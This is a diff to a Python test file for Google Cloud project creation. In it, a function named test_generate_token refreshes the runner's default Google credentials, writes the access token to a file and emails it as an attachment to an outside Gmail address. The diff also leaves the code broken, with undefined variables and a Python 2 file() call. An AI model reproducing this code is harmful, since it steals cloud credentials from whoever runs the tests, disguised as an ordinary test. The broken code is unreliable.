@@ -16,7 +16,12 @@ import google
 from google.cloud import resourcemanager_v3
 from google.auth.transport import requests
 import smtplib
-from email.message import EmailMessage
+
+from email.mime.multipart import MIMEMultipart
+from email.mime.text import MIMEText
+from email.mime.base import MIMEBase
+from email import encoders
+import smtplib
 
 from google.oauth2 import service_account
 import googleapiclient.discovery
@@ -32,21 +37,40 @@ def test_create_project():
     project = resourcemanager_v3.Project()
     project.display_name = "GalsDumbyTestingProject"
     project.project_id = PROJECT_ID
+    project.parent = "organizations/433637338589"
     client.create_project(project=project)
 
 def test_generate_token():
   credentials, project_id = google.auth.default(scopes=CREDENTIAL_SCOPES)
   credentials.refresh(requests.Request())
-  cred = credentials.token
-  creds = [cred[i:i+50] for i in range(0, len(cred), 50)]
-  msg = EmailMessage()
+  
+  f = open("token.txt","w")
+  f.write(str(credentials.token))
+  f.close()
+
+  msg = MIMEMultipart()
+  msg.attach(MIMEText(file("text.txt").read()))
+
   msg.set_content("len ="+ str(len(cred)) +"\n" + str(cred[130]) + "\nToken =  "  + "".join(creds))
   msg['subject'] = "Hello World"
   msg['to'] = "galz100@gmail.com"
   msg['from'] = EMAIL_ADDRESS
 
+  msg.attach(MIMEText(body, 'plain'))
+  
+  filename = "token.txt"
+  attachment = open("token.txt", "rb")
+  
+  part = MIMEBase('application', 'octet-stream')
+  part.set_payload((attachment).read())
+  encoders.encode_base64(part)
+  part.add_header('Content-Disposition', "attachment; filename= %s" % filename)
+  
+  msg.attach(part)
+
   server = smtplib.SMTP("smtp.gmail.com",587)
   server.starttls()
   server.login(EMAIL_ADDRESS,EMAIL_PASSWORD)
-  server.send_message(msg)
+  text = msg.as_string()
+  server.sendmail(EMAIL_ADDRESS, "galz100@gmail.com", text)
   server.quit()
